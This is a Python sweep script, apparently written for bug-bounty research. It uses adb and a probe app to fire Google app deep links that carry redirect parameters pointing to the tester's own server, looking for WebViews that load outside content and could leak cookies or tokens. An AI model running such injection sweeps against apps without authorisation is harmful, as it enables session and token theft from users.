#!/usr/bin/env python3
"""WebView confused-deputy sweep, optimised.

Each test injects a UNIQUE token into a Google BROWSABLE deep link. A hit on /beacon or the
token path means a Google app's WebView loaded attacker-controlled content -> script execution
inside a privileged Google app = cookie/token theft.
Attribution is by token, so no per-test log polling is needed (that was what made v1 slow).
"""
import json, os, re, subprocess, sys, time, urllib.parse

BASE="/Users/sandiyochristan/Downloads/ExtractedApks"
ME="192.168.1.36:8899"
def sh(c): return subprocess.run(c,shell=True,capture_output=True,text=True,timeout=90)

CLAIMS=json.load(open(BASE+"/manifests/web_claims.json"))
PARAMS=["url","u","q","redirect","next","continue","link","href","target","site",
        "redirect_url","web_url","return_url","uri","page","ref"]

def targets():
    out=[];seen=set()
    for host,comps in CLAIMS.items():
        for c in comps:
            if c.get("permission"): continue
            if not (c.get("schemes") or c.get("hosts")): continue
            paths=[p for p in (c["paths"] or []) if not p.startswith("@")] or [""]
            for p in paths[:2]:
                k=(host,p)
                if k in seen: continue
                seen.add(k); out.append((host,p,c["pkg"],c["type"]))
    return out

def fire(url,label):
    cmd={"type":"start","action":"android.intent.action.VIEW","data":url,"label":label}
    open("/tmp/c.json","w").write(json.dumps(cmd))
    subprocess.run(["adb","push","/tmp/c.json","/sdcard/Android/data/com.vrp.probe/files/cmd.json"],
                   capture_output=True)
    sh("adb shell am start -n com.vrp.probe/.UiActivity >/dev/null 2>&1")

if __name__=="__main__":
    tg=targets()
    print(f"targets={len(tg)} params={len(PARAMS)} total_tests={len(tg)*len(PARAMS)}",flush=True)
    open(LOG:="/tmp/wv_markers.txt","w").close()
    n=0
    for i,(host,path,pkg,typ) in enumerate(tg):
        for pname in PARAMS:
            tok=f"T{i:04d}_{pname}"
            u=f"https://{host}{path}?{pname}=http%3A%2F%2F{ME}%2F{tok}"
            print(tok,file=open(LOG,"a"))
            fire(u,tok); n+=1
            time.sleep(2.6)
        if i%20==0: print(f"  ..{i}/{len(tg)} fired={n}",flush=True)
    print(f"FIRED {n}",flush=True)
